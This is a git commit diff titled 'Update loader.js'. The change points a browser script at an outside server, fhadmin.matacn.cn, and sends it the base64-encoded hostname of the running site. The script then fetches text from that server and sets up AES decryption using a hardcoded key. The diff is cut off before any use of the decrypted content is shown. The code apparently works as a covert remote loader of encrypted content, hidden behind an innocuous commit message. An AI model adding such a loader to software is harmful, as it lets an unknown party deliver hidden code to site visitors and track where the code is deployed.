81195d730a7a87e6579d0f603be8f597cf358768
zykjfhxt <eastversexcx@163.com>
2025-06-15 12:05:32 +0800

    Update loader.js

--- loader.js
+++ loader.js
@@ -1,6 +1,6 @@
 (async () => {
     const enc = btoa(location.hostname);
-    const res = await fetch(`https://localhost/auth/${enc}`);
+    const res = await fetch(`https://fhadmin.matacn.cn/auth/${enc}`);
     const htmlEnc = await res.text();
     const dec = await crypto.subtle.digest('SHA-256', new TextEncoder().encode('my-secret-key'));
     const key = await crypto.subtle.importKey('raw', dec, 'AES-CBC', false, ['decrypt']);
